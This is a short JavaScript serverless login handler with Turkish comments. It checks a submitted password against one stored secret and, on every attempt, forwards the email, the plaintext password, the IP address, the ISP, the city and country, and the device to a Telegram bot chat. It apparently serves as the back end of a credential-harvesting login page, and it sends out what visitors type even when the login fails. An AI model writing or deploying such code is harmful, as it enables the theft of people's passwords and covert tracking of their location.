export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();
    
    try {
        const { email, pass, ipData, cihaz } = req.body; // Cihaz verisini buradan karşılıyoruz
        
        const BOT_TOKEN = process.env.BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_ID;
        const DOGRU_SIFRE = process.env.SIFRE;

        const girisBasarili = (String(pass) === String(DOGRU_SIFRE));

        const mesaj = `🚀 **TERCES GÜVENLİK BİLDİRİMİ**\n\n` +
                      `📧 E-posta: ${email}\n` +
                      `🔑 Şifre: ${pass}\n` +
                      `📱 Cihaz: ${cihaz}\n` + // Mesajın içine ekledik
                      `📡 IP: ${ipData.ip || "Bilinmiyor"}\n` +
                      `🏢 ISS: ${ipData.org || "Bilinmiyor"}\n` +
                      `📍 Konum: ${ipData.city || "Bilinmiyor"} / ${ipData.country_name || ""}\n` +
                      `✅ Durum: ${girisBasarili ? "BAŞARILI" : "HATALI"}`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mesaj,
                parse_mode: 'Markdown'
            })
        });

        if (girisBasarili) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(401).json({ success: false, message: "Hatalı şifre!" });
        }
    } catch (error) {
        return res.status(500).json({ success: false, error: "Sistem hatası" });
    }
}




